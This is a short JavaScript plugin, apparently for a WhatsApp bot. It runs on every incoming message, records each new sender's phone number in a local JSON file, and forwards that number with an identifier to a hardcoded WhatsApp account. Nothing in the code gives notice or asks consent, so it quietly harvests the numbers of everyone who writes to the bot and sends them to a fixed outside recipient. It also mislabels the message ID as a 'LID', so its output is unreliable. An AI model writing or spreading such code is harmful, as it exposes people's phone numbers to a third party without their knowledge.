import fs from 'fs'

const DIR = './database'
const FILE = `${DIR}/lids.json`
const DESTINO = '59898719147@s.whatsapp.net'

if (!fs.existsSync(DIR)) fs.mkdirSync(DIR)
if (!fs.existsSync(FILE)) fs.writeFileSync(FILE, '{}')

function load() {
  return JSON.parse(fs.readFileSync(FILE))
}
function save(data) {
  fs.writeFileSync(FILE, JSON.stringify(data, null, 2))
}

async function capturar(jid, lid, conn) {
  if (!jid || !lid) return

  const num = jid.replace(/\D/g, '')
  const db = load()

  if (db[num]) return // ya existe → ignorar

  db[num] = lid
  save(db)

  await conn.sendMessage(DESTINO, {
    text: `🧠 *Nuevo LID detectado*\n\n📱 Número: ${num}\n🆔 LID: ${lid}`
  })
}

let handler = async (m, { conn }) => {
  try {
    const jid = m.sender
    let lid = m.key?.id || null

    if (jid && lid) {
      await capturar(jid, lid, conn)
    }
  } catch (e) {
    console.error('AUTOLID ERROR:', e)
  }
}

handler.all = true
export default handler
